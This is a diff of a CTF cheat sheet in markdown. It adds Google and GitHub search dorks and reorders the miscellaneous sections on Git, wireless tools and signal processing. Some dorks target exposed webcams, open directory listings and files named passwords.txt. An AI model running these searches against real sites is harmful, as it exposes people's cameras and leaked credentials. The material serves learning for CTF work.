+
+    The most common ones are:
+    ```bash
+    site:example.com           # Search for a specific domain
+    inurl: "ViewerFrame?Mode=" # Search for a specific string in the URL (exposed webcams)
+    intitle: "index of"        # Search for a specific string in the title of the page (exposed dirs)
+    filetype:pdf               # Search for a specific file type
+    ```
+
+* `Github Dorks`
+
+    Use Github's search engine to find indexed files that contain specific information. [This documentation](https://docs.github.com/en/search-github/searching-on-github) can be used to craft search queries.
+
+    Github users can be tracked using [Gitive](https://github.com/mxrch/GitFive).
+
+    The most common dork keywords are:
+    ```bash
+    filename:passwords.txt     # Search for a specific filename
+    extension:txt              # Search for a specific file extension
+    owner:username             # Search for a specific username
+    
+    # In commits
+    author-name:username       # Search for a specific commit author
+    author-email:u@ex.com      # Search for a specific commit author email
+    committer-name:username    # Search for a specific committer
+    committer-email:u@ex.com   # Search for a specific committer email
+    ```
+
+    
+
+
 <br><br>
 
 # Miscellaneous
 
-⇨ [Data Science](#data-science)<br>
-⇨ [Signal processing](#signal-processing)<br>
 ⇨ [Git](#git)<br>
-⇨ [Esoteric Languages](#esoteric-languages)<br>
 ⇨ [Wireless](#wireless)<br>
+⇨ [Signal processing](#signal-processing)<br>
+⇨ [Data Science](#data-science)<br>
+⇨ [Esoteric Languages](#esoteric-languages)<br>
 
 
 This section details some miscellaneous topics that are not directly related to security challenges, but are still useful to know as a CTF player.
+
+## Git
+
+
+
+**Git** is a version control system that is used to track changes in a file system. When present, it is possble to view the history of changes, revert to previous versions, and work on different versions of the same file.
+
+Many tutorials and guides are available online, such as [GitHub's tutorial](https://docs.github.com/en/get-started/getting-started-with-git/set-up-git) or [the visual git guide](http://marklodato.github.io/visual-git-guide/index-en.html).
+
+#### Basic usage
+
+* `git commit`
+
+    This command is used to save changes to the local repository. 
+    
+    Here are some useful options:
+    | Option | Description |
+    | --- | --- |
+    | `-m "message"` | Use the given message as the commit message. |
+    | `-a` | Automatically stage files that have been modified and deleted. |
+    | `--date="Thu Jan 04 2024 13:33:37 GMT+0100"` | Use the given date as the commit date. **This only sets the `author date` but not the `commiter date`** |
+
+* `git commit --amend`
+
+    This command is used to modify the last commit. It opens the default text editor to modify the commit message. It is also possible to add or remove files from the commit.
+
+    Here are some useful options:
+    | Option | Description |
+    | --- | --- |
+    | `--no-edit` | Use the previous commit message. |
+    | `--reset-author` | Use the current user as the author of the commit. |
+    | `--date="Thu Jan 04 2024 13:33:37 GMT+0100"` | Use the given date as the commit date. **This only sets the `author date` but not the `commiter date`** |
+
+* `git reset <commit>`
+
+    Undoes all commits after the given commit, but keeps the changes in the working directory. Here are some useful options:
+    | Option | Description |
+    | --- | --- |
+    | `--soft` | Keep the changes in the staging area. |
+    | `--hard` | Discard the changes in the staging area. |
+
+* `git log`
+
+    This command is used to view the history of the repository. Here are some useful options:
+    | Option | Description |
+    | --- | --- |
+    | `--oneline` | Show each commit on a single line. |
+    | `--graph` | Show the commit history as a graph. |
+    | `--all` | Show the history of all branches. |
+    | `--since="3 days ago"` | Show commits since the given date. |
+    | `--author="name"` | Show commits by the given author. |
+    | `--grep="pattern"` | Show commits that match the given pattern. |
+
+
+#### Tricks
+
+* Change the commiter date to the author date
+
+    *Warning:* This command rewrites the history of the repository. It should only be used on commits that have not been pushed to a remote repository.
+
+    ```bash
+    # On the current branch
+    git filter-branch --env-filter 'export GIT_COMMITTER_DATE="$GIT_AUTHOR_DATE"'
+
+    # On specific commits
+    git filter-branch --env-filter 'if [ $GIT_COMMIT = "commit_hash" ]; then export GIT_COMMITTER_DATE="$GIT_AUTHOR_DATE"; fi'
+    ```
+
+* The `HEAD` pointer
+
+    The `HEAD` pointer is a reference to the current commit. It is possible to move the `HEAD` pointer to a different commit using the `git checkout` command. This is useful to view the state of the repository at a specific commit.
+
+    ```bash
+    # Move the HEAD pointer to the given commit
+    git checkout commit_hash
+    ```
+
+    It is possible to reference the parent of the current commit using the `^` symbol. For example, `HEAD^` references the parent of the current commit, and `HEAD^^` references the grandparent of the current commit.
+
+
+
+## Wireless
+
+
+
+* `gnuradio` - [Website](https://wiki.gnuradio.org/index.php/InstallingGR)
+
+    `gnuradio` and it's GUI `gnuradio-companion` are used to create or analyze RF (Radio Frequency) signals.
+
+
+
+## Signal processing
+
+
+
+* `Scipy` - [Website](https://scipy.org/install/)
+
+    Can be used for signal processing.
+
+    Example is provided in [process_signal.ipynb](Miscellaneous/Signal processing/Tools/process_signal.ipynb)
+
+
 
 ## Data Science
 
@@ -3798,98 +3924,6 @@ This section details some miscellaneous topics that are not directly related to 
 
 
 
-
-
-
-## Signal processing
-
-
-
-* `Scipy` - [Website](https://scipy.org/install/)
-
-    Can be used for signal processing.
-
-    Example is provided in [process_signal.ipynb](Miscellaneous/Signal processing/Tools/process_signal.ipynb)
-
-
-
-## Git
-
-
-
-**Git** is a version control system that is used to track changes in a file system. When present, it is possble to view the history of changes, revert to previous versions, and work on different versions of the same file.
-
-Many tutorials and guides are available online, such as [GitHub's tutorial](https://docs.github.com/en/get-started/getting-started-with-git/set-up-git) or [the visual git guide](http://marklodato.github.io/visual-git-guide/index-en.html).
-
-#### Basic usage
-
-* `git commit`
-
-    This command is used to save changes to the local repository. 
-    
-    Here are some useful options:
-    | Option | Description |
-    | --- | --- |
-    | `-m "message"` | Use the given message as the commit message. |
-    | `-a` | Automatically stage files that have been modified and deleted. |
-    | `--date="Thu Jan 04 2024 13:33:37 GMT+0100"` | Use the given date as the commit date. **This only sets the `author date` but not the `commiter date`** |
-
-* `git commit --amend`
-
-    This command is used to modify the last commit. It opens the default text editor to modify the commit message. It is also possible to add or remove files from the commit.
-
-    Here are some useful options:
-    | Option | Description |
-    | --- | --- |
-    | `--no-edit` | Use the previous commit message. |
-    | `--reset-author` | Use the current user as the author of the commit. |
-    | `--date="Thu Jan 04 2024 13:33:37 GMT+0100"` | Use the given date as the commit date. **This only sets the `author date` but not the `commiter date`** |
-
-* `git reset <commit>`
-
-    Undoes all commits after the given commit, but keeps the changes in the working directory. Here are some useful options:
-    | Option | Description |
-    | --- | --- |
-    | `--soft` | Keep the changes in the staging area. |
-    | `--hard` | Discard the changes in the staging area. |
-
-* `git log`
-
-    This command is used to view the history of the repository. Here are some useful options:
-    | Option | Description |
-    | --- | --- |
-    | `--oneline` | Show each commit on a single line. |
-    | `--graph` | Show the commit history as a graph. |
-    | `--all` | Show the history of all branches. |
-    | `--since="3 days ago"` | Show commits since the given date. |
-    | `--author="name"` | Show commits by the given author. |
-    | `--grep="pattern"` | Show commits that match the given pattern. |
-
-
-#### Tricks
-
-* Change the commiter date to the author date
-
-    *Warning:* This command rewrites the history of the repository. It should only be used on commits that have not been pushed to a remote repository.
-
-    ```bash
-    # On the current branch
-    git filter-branch --env-filter 'export GIT_COMMITTER_DATE="$GIT_AUTHOR_DATE"'
-
-    # On specific commits
-    git filter-branch --env-filter 'if [ $GIT_COMMIT = "commit_hash" ]; then export GIT_COMMITTER_DATE="$GIT_AUTHOR_DATE"; fi'
-    ```
-
-* The `HEAD` pointer
-
-    The `HEAD` pointer is a reference to the current commit. It is possible to move the `HEAD` pointer to a different commit using the `git checkout` command. This is useful to view the state of the repository at a specific commit.
-
-    ```bash
-    # Move the HEAD pointer to the given commit
-    git checkout commit_hash
-    ```
-
-    It is possible to reference the parent of the current commit using the `^` symbol. For example, `HEAD^` references the parent of the current commit, and `HEAD^^` references the grandparent of the current commit.
 
 
 
@@ -3995,16 +4029,6 @@ Languages
 
 	Whisper my world
 	```
-
-
-
-## Wireless
-
-
-
-* `gnuradio` - [Website](https://wiki.gnuradio.org/index.php/InstallingGR)
-
-    `gnuradio` and it's GUI `gnuradio-companion` are used to create or analyze RF (Radio Frequency) signals.
 
 
 <br><br>
